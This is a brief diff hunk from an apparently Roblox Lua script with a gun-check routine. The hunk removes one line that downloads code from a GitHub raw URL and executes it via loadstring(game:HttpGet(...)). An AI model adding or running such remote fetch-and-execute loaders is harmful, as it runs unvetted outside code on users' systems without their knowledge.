@@ -907,6 +907,3 @@ RunService.RenderStepped:Connect(function()
 end)
 -- Initial scan
 instantGunCheck()
-
--- Run the additional script as a new one after this
-loadstring(game:HttpGet("https://raw.githubusercontent.com/johnkate9700-create/asylum-life/refs/heads/main/flex"))()
